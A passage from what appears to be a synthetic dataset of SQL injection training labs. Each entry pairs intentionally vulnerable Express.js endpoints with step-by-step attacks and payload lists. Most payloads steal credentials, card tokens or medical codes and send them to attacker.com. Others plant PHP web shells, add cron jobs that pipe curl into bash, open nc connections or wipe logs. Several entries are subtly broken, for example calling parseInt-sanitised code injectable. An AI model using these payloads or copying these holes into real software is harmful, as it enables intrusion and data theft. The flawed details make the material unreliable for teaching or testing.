    "Lab scenario": "IoT Device Boolean-Blind SQLi in Sensor Group HAVING Clause",
    "Lab Description": "An industrial sensor monitoring system constructs HAVING clauses using unsanitized group IDs with boolean response patterns. The SQLite backend provides no direct error feedback but returns HTTP 204 for valid queries. To solve: Extract device admin credentials using bitwise brute-force techniques and differential timing analysis while bypassing request throttling limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /api/sensor-groups with group_id=1",
      "2. Identify boolean condition: {\"group_id\":\"1' AND 1=1--\"} returning 204",
      "3. Develop Python script using binary search: (ASCII(SUBSTR((SELECT password FROM users),1)) >> 3 & 31",
      "4. Bypass rate limits with IP rotation and header randomization",
      "5. Correlate response times with credential bits"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE sensors (id INT, group_id INT, value REAL)\");\n  db.run(\"INSERT INTO sensors VALUES (1, 1, 25.3)\");\n  db.run(\"CREATE TABLE users (username TEXT, password TEXT)\");\n  db.run(\"INSERT INTO users VALUES ('admin', 's3cr3tP@ss!123')\");\n});\n\napp.post('/api/sensor-groups', (req, res) => {\n  const groupId = req.body.group_id;\n  const query = `\n    SELECT sensor_id, AVG(value) \n    FROM sensors \n    GROUP BY sensor_id \n    HAVING group_id = ${groupId}`;\n\n  db.all(query, (err, rows) => {\n    if (err || rows.length === 0) return res.status(400).end();\n    res.status(204).end(); // Boolean response pattern\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND (SELECT SUBSTR(password,1,1) FROM users) = 's'--",
      "' OR (SELECT LENGTH(password) FROM users)=12 AND '1'='1",
      "') AND (SELECT HEX(SUBSTR(password,1)) FROM users) > '30'--",
      "' AND RANDOMBLOB(100000000) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Time-Based SQLi in Patient Search LIMIT Clause",
    "Lab Description": "A medical records system constructs LIMIT/OFFSET clauses using unsanitized pagination parameters with PostgreSQL backend. The application provides no visual feedback but allows stacked queries with pg_sleep(). To solve: Exfiltrate sensitive diagnosis codes through DNS-based out-of-band channel using conditional time delays and COPY TO PROGRAM vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /patients?page=2 parameter",
      "2. Verify time delay: 1; SELECT CASE WHEN 1=1 THEN pg_sleep(5) END--",
      "3. Configure Interactsh client for DNS callback monitoring",
      "4. Craft payload: 1; COPY (SELECT icd_code FROM diagnoses) TO PROGRAM 'nslookup $(hostname).attacker.com'--",
      "5. Correlate DNS logs with extracted medical codes"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { Pool } = require('pg');\nconst app = express();\n\nconst pool = new Pool({\n  host: 'localhost',\n  database: 'medical_records',\n  ssl: false\n});\n\napp.get('/patients', async (req, res) => {\n  const page = parseInt(req.query.page) || 1;\n  const offset = (page - 1) * 10;\n  \n  try {\n    const query = `SELECT * FROM patients LIMIT 10 OFFSET ${offset}`;\n    const result = await pool.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).send('Query error');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "; SELECT CASE WHEN (SELECT COUNT(*) FROM diagnoses)=100 THEN pg_sleep(10) END--",
      "0; CREATE TEMP TABLE exfil(data text); INSERT INTO exfil SELECT icd_code FROM diagnoses; COPY exfil TO PROGRAM 'curl http://attacker.com/?data='$(cat exfil)'--",
      "1%3b%20CREATE%20OR%20REPLACE%20FUNCTION%20exfil(TEXT)%20RETURNS%20VOID%20AS%20$$%20COPY%20tmp%20FROM%20PROGRAM%20'ping%20-c%201%20'||$1||'.attacker.com'%3b%20$$%20LANGUAGE%20SQL%3b%20SELECT%20exfil(icd_code)%20FROM%20diagnoses--",
      "0' UNION SELECT NULL,current_database(),NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Union-Based SQLi in Product Filter ORDER BY",
    "Lab Description": "An online marketplace constructs ORDER BY clauses using unsanitized JSON input parameters with MSSQL backend. The vulnerable endpoint returns detailed type conversion errors through debug headers. To solve: Extract credit card tokens using multi-stage UNION attacks with explicit type casting and FOR JSON PATH output bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept POST /api/products/search with 'sort' parameter",
      "2. Trigger error: {\"sort\":\"name')\"} to expose query structure",
      "3. Determine column count using ORDER BY 9999--",
      "4. Extract tokens: ' UNION SELECT NULL,STRING_AGG(card_token,','),NULL FOR JSON PATH--",
      "5. Decode nested JSON results and clear event logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.use(express.json());\n\nconst config = {\n  user: 'ecom_user',\n  password: 'P@ssw0rd123',\n  server: 'localhost',\n  options: { encrypt: false }\n};\n\napp.post('/api/products/search', async (req, res) => {\n  try {\n    const { sort } = req.body;\n    const pool = await mssql.connect(config);\n    const query = `SELECT product_id, name, price FROM products ORDER BY ${sort}`;\n    \n    console.debug('Executing:', query); // Debug logging\n    const result = await pool.request().query(query);\n    \n    res.set('X-Query-Debug', 'true')\n       .json(result.recordset);\n  } catch (err) {\n    res.status(500)\n       .set('X-SQL-Error', err.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,card_token,NULL FROM payments FOR JSON PATH--",
      "' AND 1=CONVERT(INT,(SELECT TOP 1 card_token FROM payments))--",
      "'%00' UNION SELECT 1,CAST(card_token AS XML),3 FROM payments FOR XML PATH('')--",
      "'; INSERT INTO exfil(data) SELECT card_token FROM payments--"
    ]
  },
  {
    "Lab scenario": "Government Portal Second-Order SQLi in Document Comments",
    "Lab Description": "A municipal document system stores unsanitized user input in comment metadata that later gets used in report generation queries. The Oracle backend allows DBMS_SCHEDULER access but filters semicolons. To solve: Poison document metadata with time-based payloads and trigger PDF export to execute OS commands via external tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject comment metadata: '||DBMS_LDAP.INIT((SELECT banner FROM v$version),80)--",
      "2. Schedule nightly report generation job",
      "3. Trigger PDF export through admin interface",
      "4. Exfiltrate data via DNS: UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT sys_context('userenv','current_user') FROM dual))--",
      "5. Maintain access via scheduled job creation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(express.json());\n\napp.post('/comments', async (req, res) => {\n  const { doc_id, comment } = req.body;\n  try {\n    const conn = await oracledb.getConnection();\n    await conn.execute(\n      `INSERT INTO comments (doc_id, text) \n       VALUES (${doc_id}, '${comment}')`\n    );\n    res.send('Comment added');\n  } catch (err) {\n    res.status(500).send(err.message);\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "'||UTL_INADDR.GET_HOST_NAME((SELECT password FROM users WHERE ROWNUM=1))--",
      "'||DBMS_SCHEDULER.CREATE_JOB(job_name=>'EXFIL',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>4,enabled=>FALSE,auto_drop=>TRUE,arguments=>(''-c'',''echo ${IFS}$(hostname)|nc attacker.com 1337''))--",
      "'||CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))--",
      "'||DBMS_LDAP.INIT((SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL)||'.exfil.com',80)--"
    ]
  },
  {
    "Lab scenario": "Banking API UNION-Based SQLi in Transaction Sorting",
    "Lab Description": "A financial REST API endpoint vulnerable to SQL injection in the 'sort' parameter of transaction history requests. The application constructs ORDER BY clauses using unsanitized user input and returns detailed error messages through debug headers. The Microsoft SQL Server backend requires precise type matching for UNION attacks. To solve: Extract account numbers and balances using column type coercion and error-based data exfiltration while bypassing WAF filters that block UNION operators.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept GET /api/transactions?sort=date request with Burp Suite",
      "2. Identify injectable parameter using OWASP ZAP active scan: sort=date'+AND+1=convert(int,(SELECT@@version))--",
      "3. Craft type-coerced UNION payload: ' UNION SELECT NULL,CAST(account_number AS VARCHAR(MAX)),NULL,NULL FROM accounts--",
      "4. Bypass WAF using whitespace alternatives: '/*!50000UNION*//*!50000SELECT*/",
      "5. Verify data extraction via response body and clear query logs with '; EXEC xp_cmdshell('wevtutil cl Application')--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\n\nconst config = {\n  user: 'bank_api',\n  password: 'S3cur3P@ss!',\n  server: 'dbserver',\n  options: { encrypt: false }\n};\n\napp.get('/api/transactions', async (req, res) => {\n  try {\n    const sort = req.query.sort || 'date';\n    const pool = await mssql.connect(config);\n    const query = `SELECT id, amount, date FROM transactions ORDER BY ${sort}`;\n    \n    console.debug('Executing:', query); // Verbose logging\n    const result = await pool.request().query(query);\n    \n    res.set('X-Query-Debug', 'enabled')\n       .json(result.recordset);\n  } catch (err) {\n    res.status(500)\n       .set('X-SQL-Error', err.originalError.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND 1=CONVERT(INT,(SELECT TOP 1 account_number FROM accounts))--",
      "' UNION SELECT NULL,account_number,NULL FROM accounts WHERE '1'='1",
      "'%00' UNION SELECT 1,CAST(balance AS XML),3 FROM accounts FOR XML PATH('')--",
      "'; INSERT INTO exfil(data) SELECT account_number FROM accounts--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Blind SQLi in Device Group Filter",
    "Lab Description": "An industrial control system vulnerable to boolean-based blind SQL injection in the device grouping parameter. The PostgreSQL backend provides no direct error feedback but returns different HTTP status codes for true/false conditions. To solve: Extract admin credentials through bitwise brute-force techniques and differential response analysis while evading HTTP request throttling limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Map injection point using OWASP ZAP fuzzer on group_id parameter",
      "2. Identify boolean triggers: '1'='1'-- vs '1'='2'-- via response status codes",
      "3. Develop Python script with binary search: (ASCII(SUBSTR((SELECT password FROM users),1)) > 100",
      "4. Optimize with parallel requests using multiple User-Agent headers",
      "5. Automate extraction with sqlmap: sqlmap -u http://iot/api/groups --data 'group_id=1*' --technique=B --level=5"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.post('/api/groups', (req, res) => {\n  const groupId = req.body.group_id;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  client.connect().then(() => {\n    const query = `SELECT device_id, COUNT(*) \n                 FROM sensors \n                 GROUP BY device_id \n                 HAVING group_id = ${groupId}`;\n    \n    client.query(query, (err, result) => {\n      if (err || result.rows.length === 0) return res.status(400).end();\n      res.status(204).end(); // Boolean response\n    });\n  }).catch(err => res.status(500).end());\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT CASE WHEN (ASCII(SUBSTR(password,1)) > 100 THEN 1 ELSE 1/(SELECT 0) END FROM users)=1--",
      "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=12--",
      "') AND (SELECT COUNT(*) FROM pg_catalog.pg_tables)=42--",
      "' AND (SELECT 1 FROM GENERATE_SERIES(1,10000000))--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal Time-Based SQLi in Patient Search",
    "Lab Description": "A medical records system vulnerable to stacked time-based SQL injection in pagination parameters. The MySQL backend allows delayed query execution but filters UNION operators. To solve: Exfiltrate sensitive diagnosis codes through DNS-based out-of-band channel using conditional SLEEP() statements and LOAD_FILE() function while bypassing file privilege restrictions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /patients?page=2 parameter",
      "2. Verify time delay: '; SELECT IF(1=1,SLEEP(5),0)--",
      "3. Configure Burp Collaborator for DNS callback monitoring",
      "4. Craft payload: '; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT icd_code FROM diagnoses LIMIT 1),'.attacker.com'))--",
      "5. Correlate DNS logs with extracted medical codes"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'healthcare_user',\n  password: 'Insecure123',\n  database: 'patient_records'\n});\n\napp.get('/patients', (req, res) => {\n  const page = parseInt(req.query.page) || 1;\n  const offset = (page - 1) * 10;\n  const query = `SELECT * FROM patients LIMIT 10 OFFSET ${offset}`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "; SELECT SLEEP(10)--",
      "' OR IF(ASCII(SUBSTR((SELECT icd_code FROM diagnoses),1))>100, SLEEP(5), 0)--",
      "'; CREATE TABLE exfil(data TEXT); LOAD DATA INFILE '/etc/passwd' INTO TABLE exfil--",
      "' UNION SELECT NULL,LOAD_FILE('/var/www/config.ini'),NULL--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Error-Based SQLi in Product Filter",
    "Lab Description": "An online marketplace vulnerable to verbose error-based SQL injection in JSON search parameters. The Oracle backend leaks database schema through unhandled type conversion errors. To solve: Extract credit card tokens using nested error-induced data exfiltration and second-order injection via product review comments.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Trigger error with malformed JSON: {\"category\":\"Electronics')\"}",
      "2. Extract table structure via error message analysis",
      "3. Craft nested error payload: ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT card_token FROM payments))--",
      "4. Inject review comment with second-order payload: '||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT card_token FROM payments))--",
      "5. Correlate web server logs with extracted tokens"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst oracledb = require('oracledb');\nconst app = express();\napp.use(express.json());\n\napp.post('/api/products/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let whereClause = Object.entries(filters)\n      .map(([key, val]) => `${key} = '${val}'`)\n      .join(' AND ');\n\n    const conn = await oracledb.getConnection();\n    const result = await conn.execute(`SELECT * FROM products WHERE ${whereClause}`);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500)\n       .set('Oracle-Error', err.message)\n       .json({ error: 'Query failed' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT card_token FROM payments WHERE ROWNUM=1))--",
      "'%00' UNION SELECT NULL,XMLType(card_token).getStringVal(),NULL FROM payments--",
      "'; EXECUTE IMMEDIATE 'CREATE USER attacker IDENTIFIED BY pwned'--",
      "'||DBMS_LDAP.INIT((SELECT card_token FROM payments)||'.exfil.com',80)--"
    ]
  },
  {
    "Lab scenario": "CMS Second-Order SQLi in User Registration",
    "Lab Description": "A content management system stores unsanitized user input during registration that later gets used in password reset queries. The SQLite backend allows stacked queries but filters semicolons. To solve: Poison user metadata with time-based payloads and trigger password reset to execute OS commands via ATTACH DATABASE vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Register user with poisoned email: '||(SELECT CASE WHEN 1=1 THEN LOAD_EXTENSION('evil.so') END))--",
      "2. Initiate password reset for target admin account",
      "3. Exploit second-order injection in reset token generation",
      "4. Execute commands via ATTACH DATABASE: '; ATTACH DATABASE '/var/www/cmd.php' AS pwn;--",
      "5. Access injected PHP web shell via HTTP"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.urlencoded());\n\nconst db = new sqlite3.Database('cms.db');\n\napp.post('/register', (req, res) => {\n  const { username, email } = req.body;\n  db.run(\n    `INSERT INTO users (username, email) \n     VALUES ('${username}', '${email}')`, \n    (err) => {\n      if (err) return res.status(500).send(err.message);\n      res.send('Registration complete');\n    }\n  );\n});\n\napp.listen(3000);",
    "payloads": [
      "'||(SELECT LOAD_EXTENSION('\\\\attacker.com\\share\\evil.dll'))--",
      "'; ATTACH DATABASE '/var/www/shell.php' AS pwn; CREATE TABLE pwn.exec (cmd TEXT); INSERT INTO exec VALUES ('<?php system($_GET[0]); ?>')--",
      "'||(SELECT WRITEFILE('/etc/cron.d/pwn', '* * * * * root curl http://attacker.com/pwn.sh | bash'))--",
      "'; .open --hexdata 3c3f7068700a..."
    ]
  },
  {
    "Lab scenario": "Government Portal Union-Based SQLi in Document Metadata",
    "Lab Description": "A municipal records system constructs SQL queries using unsanitized document IDs in SELECT clauses. The PostgreSQL backend requires explicit type casting for UNION operators and returns JSON-formatted results. To solve: Extract sensitive tax records through multi-stage type-coerced UNION attacks and XML encoding bypasses while evading content security policies.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept GET /documents/12345 request with Burp Suite",
      "2. Determine column count using ORDER BY 9999--",
      "3. Match JSON types: ' UNION SELECT NULL,to_json(tax_record),NULL FROM tax_records--",
      "4. Bypass output encoding using json_agg() function",
      "5. Decode results and purge audit logs using stacked queries"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst pg = require('pg');\nconst app = express();\n\napp.get('/documents/:id', async (req, res) => {\n  const docId = req.params.id;\n  const client = new pg.Client(process.env.DB_URL);\n  \n  try {\n    await client.connect();\n    const query = `SELECT title, content FROM documents WHERE id = ${docId}`;\n    const result = await client.query(query);\n    res.json(result.rows);\n  } catch (err) {\n    res.status(500).json({ error: err.message });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' UNION SELECT NULL,json_agg(tax_record)::text,NULL FROM tax_records--",
      "' AND 1=CAST((SELECT COUNT(*) FROM tax_records) AS INT)--",
      "'%00' UNION SELECT NULL,XMLAGG(XMLELEMENT(e, ssn)).EXTRACT('//text()'),NULL FROM citizens--",
      "'; COPY tax_records TO PROGRAM 'curl http://attacker.com/$(date)'-"
    ]
  },
  {
    "Lab scenario": "Social Media Platform Time-Based SQLi in Notifications",
    "Lab Description": "A social network vulnerable to stacked time-based injection in notification tracking parameters. The MySQL backend allows delayed query execution but filters UNION operators. To solve: Exfiltrate private messages through DNS-based out-of-band channel using conditional BENCHMARK() delays and INTO OUTFILE vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /notifications?user=123 parameter",
      "2. Verify time delay: ' OR BENCHMARK(5000000,MD5('test'))--",
      "3. Configure Interactsh client for DNS monitoring",
      "4. Craft payload: ' OR (SELECT message FROM pms INTO OUTFILE '/var/www/html/leak.txt')--",
      "5. Retrieve exfiltrated data via direct HTTP access"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'social_user',\n  password: 'P@ssw0rd123',\n  database: 'social_db'\n});\n\napp.get('/notifications', (req, res) => {\n  const userId = req.query.user;\n  const query = `SELECT * FROM notifications WHERE user_id = ${userId}`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send('Query error');\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR IF(ASCII(SUBSTR((SELECT password FROM users),1)>100, BENCHMARK(10000000,SHA1('a')),0)--",
      "'; SELECT message FROM pms INTO DUMPFILE '/var/www/html/exfil.txt'--",
      "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL--",
      "'; GRANT FILE ON *.* TO 'social_user'@'localhost'--"
    ]
  },
  {
    "Lab scenario": "Healthcare API Boolean-Blind SQLi in Patient Search",
    "Lab Description": "A HIPAA-compliant patient portal vulnerable to boolean-based blind injection in JSON search parameters. The Microsoft SQL Server backend provides no error feedback but returns different HTTP status codes. To solve: Extract medical record numbers through bitwise brute-force techniques and differential header analysis while bypassing request rate limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture POST /api/patients/search request with Postman",
      "2. Identify boolean condition: {\"ssn\":\"123-45-6789' AND '1'='1\"}",
      "3. Develop Python script using binary search: (ASCII(SUBSTR((SELECT mrn FROM records),1)) & 64",
      "4. Bypass rate limits with Tor network rotation",
      "5. Correlate HTTP 200/404 responses with extracted data bits"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mssql = require('mssql');\nconst app = express();\napp.use(express.json());\n\nconst config = {\n  user: 'health_user',\n  password: 'Secure123!',\n  server: 'dbserver',\n  options: { encrypt: true }\n};\n\napp.post('/api/patients/search', async (req, res) => {\n  try {\n    const filters = req.body;\n    let whereClause = Object.entries(filters)\n      .map(([key, val]) => `${key} = '${val}'`)\n      .join(' AND ');\n\n    const pool = await mssql.connect(config);\n    const result = await pool.request().query(`SELECT * FROM patients WHERE ${whereClause}`);\n    res.json(result.recordset.length > 0 ? 200 : 404);\n  } catch (err) {\n    res.status(500).end();\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND (SELECT SUBSTRING(mrn,1,1) FROM records) = 'A'--",
      "' OR (SELECT LENGTH(mrn) FROM records)=8 AND '1'='1",
      "') AND (SELECT COUNT(*) FROM information_schema.tables)=42--",
      "' AND (SELECT TOP 1 mrn FROM records) LIKE 'M%'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Second-Order SQLi in Product Reviews",
    "Lab Description": "An online marketplace stores unsanitized user input in product reviews that later gets used in inventory queries. The SQLite backend allows stacked queries through multiple statement execution. To solve: Poison review content with time-based payloads and trigger inventory export to execute OS commands via ATTACH DATABASE vector.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Submit product review with payload: '||(SELECT CASE WHEN 1=1 THEN LOAD_EXTENSION('evil.so') END)--",
      "2. Trigger nightly inventory CSV export",
      "3. Exploit second-order injection in export query",
      "4. Execute commands via: '; ATTACH DATABASE '/var/www/shell.php' AS pwn;--",
      "5. Access web shell through HTTP interface"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.urlencoded());\n\nconst db = new sqlite3.Database('ecom.db');\n\napp.post('/reviews', (req, res) => {\n  const { product_id, content } = req.body;\n  db.run(\n    `INSERT INTO reviews (product_id, content) \n     VALUES (${product_id}, '${content}')`, \n    (err) => {\n      if (err) return res.status(500).send(err.message);\n      res.send('Review posted');\n    }\n  );\n});\n\napp.listen(3000);",
    "payloads": [
      "'||(SELECT WRITEFILE('/etc/cron.d/pwn', '* * * * * root curl http://attacker.com/pwn.sh'))--",
      "'; ATTACH DATABASE '/var/www/cmd.php' AS pwn; CREATE TABLE pwn.exec (cmd TEXT);--",
      "'||(SELECT LOAD_EXTENSION('\\\\\\\\attacker.com\\\\share\\\\evil.dll'))--",
      "'; .open --hexdata 3c3f7068702073797374656d28245f4745545b307d293b203f3e0000--"
    ]
  },
  {
    "Lab scenario": "IoT Device Error-Based SQLi in Firmware Updates",
    "Lab Description": "An industrial IoT controller vulnerable to verbose error-based injection in firmware version parameters. The MySQL backend leaks schema information through unhandled constraint violations. To solve: Extract device credentials through nested error-induced data exfiltration and second-order injection via configuration backups.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Trigger error: GET /firmware?version=1.2.3')",
      "2. Extract table structure via error message analysis",
      "3. Craft nested error payload: ' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(credential,FLOOR(RAND(0)*2))x FROM users GROUP BY x)y)--",
      "4. Inject backup config with second-order payload: '||UPDATE users SET password='pwned'--",
      "5. Authenticate with compromised credentials via SSH"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'iot_user',\n  password: 'Insecure123',\n  database: 'device_management'\n});\n\napp.get('/firmware', (req, res) => {\n  const version = req.query.version;\n  const query = `SELECT * FROM firmware WHERE version = '${version}'`;\n\n  pool.query(query, (err, results) => {\n    if (err) return res.status(500).send(err.message);\n    res.json(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT credential FROM users),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
      "'%00' UNION SELECT NULL,@@version,NULL--",
      "'; UPDATE users SET password='pwned' WHERE username='admin'--",
      "'||MAKE_SET(1,TOKEN) IS NOT NULL--"
    ]
  },
  {
    "Lab scenario": "Education Portal Boolean-Based SQLi in Gradebook HAVING Clause",
    "Lab Description": "A university grading system vulnerable to boolean-based injection in assignment grouping parameters. The MySQL backend provides no direct error feedback but returns different CSV formats for true/false conditions. To solve: Extract student SSNs through differential response analysis and bit-shifting brute-force techniques while evading request throttling.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Map injection point using OWASP ZAP on group_id parameter",
      "2. Identify boolean triggers: '1'='1'-- vs '1'='2'-- via CSV header presence",
      "3. Develop Python script with binary search pattern matching",
      "4. Optimize with parallel async requests using aiohttp",
      "5. Crack extracted hashes using rainbow table lookups"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst mysql = require('mysql2');\nconst app = express();\n\nconst pool = mysql.createPool({\n  host: 'localhost',\n  user: 'edu_user',\n  password: 'Insecure123!',\n  database: 'gradebook'\n});\n\napp.get('/grades', (req, res) => {\n  const groupId = req.query.group;\n  const query = `SELECT student_id, AVG(grade) \n               FROM assignments \n               GROUP BY student_id \n               HAVING class_id = ${groupId}`;\n\n  pool.query(query, (err, results) => {\n    if (err || results[0].length === 0) return res.status(404).end();\n    res.attachment('grades.csv').send(results[0]);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT MID((SELECT ssn FROM students),1,1) = 'A'--",
      "' AND (SELECT LENGTH(ssn) FROM students)=11 AND '1'='1",
      "') AND (SELECT COUNT(*) FROM information_schema.tables)=42--",
      "' AND (SELECT 1 FROM (SELECT BENCHMARK(1000000,SHA1('a')))--"
    ]
  },
  {
    "Lab scenario": "Logistics System Time-Based SQLi in Shipment Tracking",
    "Lab Description": "A package tracking system vulnerable to stacked time-based injection in tracking number parameters. The SQLite backend allows delayed query execution through randomblob() function. To solve: Exfiltrate shipment manifests through response timing analysis and filesystem operations via LOAD_EXTENSION attacks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable GET /tracking/ABC123 parameter",
      "2. Verify time delay: ' OR randomblob(100000000)--",
      "3. Develop timing correlation script with Python's timeit module",
      "4. Load malicious extension: '; SELECT load_extension('\\\\attacker.com\\share\\evil.so')--",
      "5. Execute commands through exported SQL functions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\n\nconst db = new sqlite3.Database('shipments.db');\n\napp.get('/tracking/:id', (req, res) => {\n  const trackingId = req.params.id;\n  const query = `SELECT * FROM packages WHERE tracking_id = '${trackingId}'`;\n\n  db.all(query, (err, rows) => {\n    if (err) return res.status(500).send('Tracking error');\n    res.json(rows);\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT CASE WHEN SUBSTR(manifest,1,1)='A' THEN randomblob(10000000) END FROM shipments)--",
      "'; ATTACH DATABASE '/var/www/shell.php' AS pwn; CREATE TABLE pwn.exec(cmd TEXT);--",
      "'||(SELECT WRITEFILE('/etc/cron.d/pwn', '* * * * * root curl http://attacker.com/pwn.sh'))--",
      "'; .open --hexdata 3c3f7068700a..."
    ]
  },
  {
    "Lab scenario": "Healthcare IoT Device Blind SQLi in Sensor Calibration",
    "Lab Description": "A medical device calibration interface vulnerable to boolean-based blind injection in firmware version parameters. The SQLite backend provides no error feedback but returns different calibration status codes. To solve: Extract device admin credentials through bitwise brute-force and statistical response analysis while bypassing HMAC validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture POST /calibrate request with firmware_version=1.2.3",
      "2. Identify boolean triggers using Burp Intruder cluster bomb attacks",
      "3. Develop Huffman-encoded brute-force script with Scrapy middleware",
      "4. Bypass HMAC signatures through timing oracle attacks",
      "5. Authenticate to device debug interface with extracted credentials"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3');\nconst app = express();\napp.use(express.json());\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE devices (id INT, firmware TEXT, calibrated INT)\");\n  db.run(\"INSERT INTO devices VALUES (1, '1.2.3', 0)\");\n});\n\napp.post('/calibrate', (req, res) => {\n  const version = req.body.firmware_version;\n  const query = `UPDATE devices SET calibrated = 1 WHERE firmware = '${version}'`;\n\n  db.run(query, function(err) {\n    res.json({ calibrated: this.changes > 0 ? 1 : 0 });\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "' OR (SELECT SUBSTR(password,1,1) FROM admins) = 'a' AND '1'='1",
      "' AND (SELECT LENGTH(password) FROM admins)=12 AND '1'='1",
      "') AND (SELECT HEX(SUBSTR(password,1)) FROM admins) > '30'--",
      "' AND (SELECT COUNT(*) FROM sqlite_master)=5--"
    ]
  },
  {
    "Lab scenario": "E-Commerce CMS Second-Order SQLi in Product Imports",
    "Lab Description": "A product management system vulnerable to second-order injection through CSV import functionality. The MySQL backend executes stored procedures using unsanitized import metadata. To solve: Poison product descriptions with stacked query payloads and trigger inventory sync to execute OS commands via sys_exec() UDF.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Upload CSV with poisoned description: '; CREATE TABLE exfil(cmd TEXT)--",
      "2. Trigger nightly inventory synchronization job",
      "3. Exploit second-order injection in sync procedure",
